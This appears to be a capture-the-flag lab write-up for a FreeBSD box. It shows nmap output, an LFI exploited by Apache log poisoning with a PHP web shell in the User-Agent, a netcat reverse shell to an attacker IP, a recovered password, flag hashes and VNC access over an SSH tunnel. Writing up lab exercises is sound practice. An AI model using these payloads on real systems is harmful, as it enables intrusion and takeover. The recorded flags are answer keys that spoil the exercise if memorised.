# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/poison 10.10.10.84

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA)
|   256 4ce8c602bdfc83ffc98001547d228172 (ECDSA)
|_  256 0b8fd57185901385618beb34135f943b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

```

# Port 80
LOL just an LFI sitting there. We can get phpinfo and save a file so race condition time.

Didn't work :(

Going to do the intended method and use log poisoning

So the log file:
```
/var/log/httpd-access.log
```

Saves the User-Agent, so lets put a shell there.
```
User-Agent: <?php system($REQUEST['cmd']); ?>
```

`rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.21%209001%20%3E/tmp/f`

On the box there is a pwdbackup.txt which has charix's password.
```
Charix!2#4%6&8(0
```

# Shell as Charix
user.txt:
```
eaacdfb2d141b72a589233063604209c
```

file called secret.zip.

vnc rdp is open
```
netstat -an -p tcp
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

socks tunnel
```
ssh charix@10.10.10.84 -D 1080
```

grab that zip file and extract with pwd:
```
proxychains vncviewer 127.0.0.1:5901 -passwd secret
```

root.txt
```
716d04b188419cf2bb99d891272361f5
```